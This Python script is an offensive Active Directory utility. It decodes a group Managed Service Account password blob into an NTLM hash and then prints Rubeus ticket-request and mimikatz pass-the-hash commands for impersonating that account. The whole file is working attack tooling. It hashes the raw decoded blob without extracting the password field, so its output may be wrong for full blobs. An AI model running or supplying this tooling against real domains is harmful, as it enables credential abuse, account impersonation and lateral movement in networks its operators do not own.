
#!/usr/bin/env python3
import base64, hashlib

print('\033[92m')
print('  ██████╗ ███╗   ███╗███████╗ █████╗     ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ ')
print('  ██╔════╝████╗ ████║██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗')
print('  ██║  ███╗██╔████╔██║███████╗███████║    ██║  ██║█████╗  ██║     ██║   ██║██║  ██║█████╗  ██████╔╝')
print('  ██║   ██║██║╚██╔╝██║╚════██║██╔══██║    ██║  ██║██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗')
print('  ╚██████╔╝██║ ╚═╝ ██║███████║██║  ██║    ██████╔╝███████╗╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║')
print('  ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝╚══════╝╚═╝  ╚═╝')
print('\033[0m')
print()

blob = input("\033[92m==> Insert the gMSA blob to decode please: \033[0m")

try:
    data = base64.b64decode(blob, validate=True)
except Exception:
    print("\033[91m[-] Error: invalid base64 blob\033[0m")
    exit(1)

ntlm = hashlib.new('md4', data).hexdigest()
print(f"\033[92m==> Here's the NTLM hash: \033[94m{ntlm}\033[0m")
print()
print('\033[92m[*] use the NTLM hash with Rubeus to request a TGT as gMsa account:\033[0m')
print(f'\033[94m    .\\Rubeus.exe asktgt /user:<gmsa_account> /rc4:{ntlm} /domain:<domain> /ptt\033[0m')
print()
print('\033[92m[*] PTH with mimikatz:\033[0m')
print(f'\033[94m    sekurlsa::pth /user:<gmsa_account> /rc4:{ntlm} /domain:<domain>\033[0m')
